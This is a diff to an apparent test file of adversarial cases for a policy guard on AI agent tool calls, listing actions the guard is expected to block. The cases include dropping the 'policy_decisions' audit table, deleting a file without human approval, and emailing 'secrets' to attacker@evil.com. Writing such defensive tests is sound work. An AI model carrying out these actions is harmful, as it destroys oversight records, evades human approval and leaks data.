@@ -42,15 +42,21 @@ export const adversarialCases: AdversarialCase[] = [
     expectReason: "PATH_VIOLATION",
   },
   {
+    label: "Drop the audit table via SQL",
+    tool: "db_query",
+    args: { sql: "DROP TABLE policy_decisions" },
+    expectReason: "SQL_VIOLATION",
+  },
+  {
+    label: "Delete a file without human approval",
+    tool: "file_delete",
+    args: { path: "/workspace/output/report.md" },
+    expectReason: "HITL_REQUIRED",
+  },
+  {
     label: "Call a tool that isn't in the policy at all",
     tool: "send_email",
     args: { to: "attacker@evil.com", body: "secrets" },
     expectReason: "POLICY_DEFAULT_DENY",
-  },
-  {
-    label: "Transfer to an unknown recipient",
-    tool: "wallet_transfer",
-    args: { recipient: "0x9999999999999999999999999999999999999999", amount: 10 },
-    expectReason: "RECIPIENT_VIOLATION",
   },
 ];
